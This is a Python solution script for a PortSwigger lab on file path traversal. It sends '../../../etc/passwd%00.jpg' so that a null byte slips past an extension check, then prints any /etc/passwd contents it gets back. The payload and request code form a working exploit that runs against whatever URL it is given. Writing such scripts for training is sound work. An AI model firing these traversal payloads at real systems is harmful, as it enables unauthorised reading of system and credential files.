# Lab 06 — File path traversal, validation of file extension with null byte bypass
# PortSwigger: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
#
# Vulnerability: The app validates that the filename ENDS WITH an expected
#                image extension — but the underlying file-open call treats
#                a null byte as a string terminator, silently discarding
#                everything after it (a legacy C-string behaviour)
# Aim:           Retrieve the contents of /etc/passwd
#
# Technique:
#   Append a null byte followed by a fake, valid-looking extension. The
#   string-level extension check passes (the string DOES end in .jpg), but
#   the actual file read stops at the null byte, ignoring the fake suffix.
#
#   IMPORTANT: %00 must reach the server as a literal null byte in the URL,
#   not be silently stripped or altered by `requests`' own encoding. We
#   build the URL manually to guarantee the exact byte sequence is sent.
#
# Usage: python path_traversal_lab06.py <url>

import sys
import urllib3
from proxies import proxies
from path_traversal_utils import banner, section, make_session, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TRAVERSAL_NO_EXT = "../../../etc/passwd"
BYPASS_PAYLOAD   = "../../../etc/passwd%00.jpg"

if __name__ == "__main__":
    banner()
    section("LAB 06 — VALIDATION OF FILE EXTENSION, NULL BYTE BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python path_traversal_lab06.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm traversal without a valid extension is blocked ──────
    print("  ── Step 1: confirm traversal without an allowed extension is blocked\n")
    r_blocked = session.get(f"{url}/image", params={"filename": TRAVERSAL_NO_EXT})
    print(f"  ℹ  No extension → status {r_blocked.status_code}")
    if "root:" not in r_blocked.text:
        print("  ✔  Confirmed blocked (extension check active)\n")

    # ── Step 2: null byte bypass ──────────────────────────────────────────────
    print("  ── Step 2: null byte bypass\n")
    print(f"  ℹ  Payload: {BYPASS_PAYLOAD}")
    print(f"  ℹ  String-level check: ends with '.jpg'? YES → passes")
    print(f"  ℹ  Actual file read: stops at %00 → opens /etc/passwd\n")

    # Build the URL manually — %00 must be sent as a literal percent-encoded
    # null byte, not altered by requests' own query string encoding.
    full_url = f"{url}/image?filename={BYPASS_PAYLOAD}"
    print(f"  ➜  GET {full_url}\n")

    r = session.get(full_url)
    print(f"  ℹ  Status: {r.status_code}")

    if "root:" in r.text:
        print_box("/etc/passwd contents (truncated)", r.text[:800])
    else:
        print("\n  ✘  /etc/passwd contents not found.")
        print("     Note: null byte injection is a LEGACY technique — it only")
        print("     works against older/C-based file-handling layers. Modern")
        print("     language runtimes track string length explicitly and are")
        print("     not vulnerable to this specific bypass. If this lab fails,")
        print("     double-check the exact %00 encoding reaches the server")
        print("     unmodified (inspect the raw request in Burp).")
        print_box("Raw response snippet", r.text[:400])
